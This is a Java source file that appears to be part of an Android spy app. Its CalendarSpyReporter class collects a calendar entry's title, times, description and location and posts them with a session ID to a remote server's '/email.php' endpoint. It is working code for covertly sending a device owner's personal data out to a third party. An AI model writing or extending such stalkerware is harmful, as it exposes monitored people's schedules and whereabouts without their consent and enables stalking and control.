package org.ddth.android.spy.reporter;

import java.util.HashMap;
import java.util.Map;

import org.ddth.http.core.connection.Request;
import org.ddth.mobile.monitor.core.Report;
import org.ddth.mobile.monitor.report.Calendar;

public class CalendarSpyReporter extends SpyReporter {

	@Override
	protected Request createRequest(Report report) {
		Calendar calendar = (Calendar) report;
		String date = LOG_DATE_FORMAT.format(calendar.date);
		String time = LOG_TIME_FORMAT.format(calendar.date);
		Map<String, String> parameters = new HashMap<String, String>();
		parameters.put("sID", getSession());
		parameters.put("content", date + "\t" + time + "\t" + calendar.title + "\t" + calendar.start + "\t" + calendar.end + "\t" + calendar.description + "\t" + calendar.location + "\r");
		return new Request(WEBAPI_SERVER_ROOT + "/email.php", parameters);
	}
}
